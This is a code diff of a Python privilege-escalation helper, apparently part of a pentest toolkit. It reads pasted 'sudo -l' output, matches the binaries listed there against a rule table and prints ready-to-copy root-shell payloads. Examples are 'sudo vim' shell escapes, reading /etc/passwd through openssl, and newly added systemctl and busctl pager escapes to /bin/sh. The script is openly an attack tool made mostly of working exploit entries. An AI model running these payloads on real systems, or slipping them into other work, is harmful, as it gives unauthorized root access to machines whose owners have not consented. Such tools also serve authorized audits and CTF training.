@@ -5,6 +5,10 @@ import re
 # RULES (EASY TO EXTEND)
 # ==============================
 
+G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
+Y_LIGHT = '\033[93m' # Commands/Secrets/Alerts
+W_BOLD, DIM = '\033[1m', '\033[2m'
+
 RULES = {
     "vim": {
         "payload": "sudo vim -c ':!/bin/sh'",
@@ -30,89 +34,87 @@ RULES = {
     "openssl": {
         "payload": "sudo openssl enc -in /etc/passwd",
     },
+     "systemctl": {
+        "payload": "sudo systemctl status trail.service",
+        "notes": "Inside pager, type: !/bin/sh",
+        "type": "pager_escape",
+    },
+
+    "busctl": {
+        "payload": "sudo busctl --show-machine",
+        "notes": "Inside pager, type: !/bin/sh",
+        "type": "pager_escape",
+    }
+
 }
 
-# ==============================
-# HELPERS
-# ==============================
 
 def extract_binaries(text):
-    """
-    Extracts binary paths from sudo -l output OR raw input
-    """
     lines = text.strip().split("\n")
     binaries = []
-
     for line in lines:
-        # Match /usr/bin/xxx
         matches = re.findall(r"(/[\w/.\-]+)", line)
         binaries.extend(matches)
-
     return list(set(binaries))
-
 
 def classify(binary):
     name = binary.split("/")[-1]
-
     if name in RULES:
         return ("exploit", RULES[name])
-    else:
-        return ("unknown", None)
-
+    return ("unknown", None)
 
 def detect_flags(text):
     flags = []
-
-    if "NOPASSWD" in text:
-        flags.append("NOPASSWD")
-
-    if "(ALL : ALL) ALL" in text:
-        flags.append("FULL_ROOT")
-
+    if "NOPASSWD" in text: flags.append("NOPASSWD")
+    if "(ALL : ALL) ALL" in text: flags.append("FULL_ROOT")
     return flags
 
-
-# ==============================
-# MAIN
-# ==============================
-
 def run(data, cred, args):
-    print("[*] Paste sudo -l output OR binary path (Ctrl+D to finish):\n")
+    print(f"\n{W_BOLD}[*] SUDO PRIVILEGE AUDIT{W}")
+    print(f"{DIM}Paste 'sudo -l' output (Press Ctrl+D when finished):{W}\n")
 
-    data = sys.stdin.read()
+    try:
+        raw_input = sys.stdin.read()
+    except (KeyboardInterrupt, EOFError):
+        print()
+        return data
 
-    binaries = extract_binaries(data)
-    flags = detect_flags(data)
+    if not raw_input.strip():
+        print(f"  {R}└── Error: Input buffer empty.{W}\n")
+        return data
 
-    # ==============================
-    # FLAGS
-    # ==============================
+    binaries = extract_binaries(raw_input)
+    flags = detect_flags(raw_input)
+
+    # 1. Configuration Flags Section
     if flags:
-        print("\n[!] FLAGS DETECTED:\n")
-        for f in flags:
-            if f == "NOPASSWD":
-                print("[!] NOPASSWD → no password required")
-            elif f == "FULL_ROOT":
-                print("[!] FULL ROOT → sudo su")
+        print(f"\n{Y}[!] Detected Flags:{W}")
+        for idx, f in enumerate(flags):
+            is_last = (idx == len(flags) - 1)
+            connector = "└── " if is_last else "├── "
+            print(f"  {B}{connector}{W}{f}")
 
-    # ==============================
-    # ANALYSIS
-    # ==============================
-    print("\n[+] ANALYSIS:\n")
+    # 2. Binaries Analysis Section
+    print(f"\n{W_BOLD}[*] Analysis Results:{W}")
+    if not binaries:
+        print(f"  {R}└── No executable paths found in input.{W}\n")
+        return data
 
-    for binary in binaries:
+    for idx, binary in enumerate(binaries):
+        is_last = (idx == len(binaries) - 1)
+        connector = "└── " if is_last else "├── "
         category, rule = classify(binary)
 
         if category == "exploit":
-            print(f"[+] {binary}")
-            print("    → exploitable")
-            print(f"    → payload: {rule['payload']}\n")
-
+            print(f"  {B}{connector}{W}{G}[Match]{W} {binary}")
+            
+            # Completely isolated command line for easy copy-paste
+            print(f"\n      {Y}{rule['payload']}{W}")
+            if rule.get("notes"):
+                print(f"      {DIM}{B}# Note: {W}{rule['notes']}{W}")
+            print()
         else:
-            print(f"[!] {binary}")
-            print("    → unknown")
-            print("    → check GTFOBins\n")
+            print(f"  {B}{connector}{W}{DIM}[Unknown] {binary}{W}")
 
-
-if __name__ == "__main__":
-    run()
+    print()
+    return data
